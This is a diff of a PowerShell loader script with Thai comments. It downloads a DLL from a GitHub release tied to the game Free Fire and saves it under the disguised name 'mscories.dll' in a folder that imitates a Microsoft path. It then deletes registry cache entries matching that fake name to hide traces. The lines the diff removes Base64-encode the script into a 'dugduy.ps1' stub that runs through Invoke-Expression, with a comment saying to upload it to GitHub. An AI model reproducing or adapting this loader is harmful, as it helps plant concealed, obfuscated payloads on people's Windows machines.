@@ -1,5 +1,3 @@
-# วางโค้ดต้นฉบับที่จะพรางไว้ใน Block นี้
-$rawCode = @'
 $url = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"
 $fakeName = "mscories.dll"
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
@@ -60,21 +58,3 @@ $muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\She
 Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" } | ForEach-Object {
     Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue
 }
-'@
-
-# แปลงเป็น Base64 (UTF8)
-$bytes = [System.Text.Encoding]::UTF8.GetBytes($rawCode)
-$base64Result = [Convert]::ToBase64String($bytes)
-
-# โครงสร้างสำหรับไฟล์ dugduy.ps1
-$dugduyContent = @"
-`$encoded = "$base64Result"
-`$decrypted = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$encoded))
-Invoke-Expression `$decrypted
-"@
-
-# บันทึกไฟล์ไปที่ Desktop
-$desktopPath = Join-Path $env:USERPROFILE "Desktop\dugduy.ps1"
-Set-Content -Path $desktopPath -Value $dugduyContent -Encoding UTF8
-Write-Host "สร้างไฟล์ dugduy.ps1 เรียบร้อยแล้วที่: $desktopPath" -ForegroundColor Green
-Write-Host "นำไฟล์นี้ไปอัปโหลดขึ้น GitHub ได้เลย!" -ForegroundColor Yellow
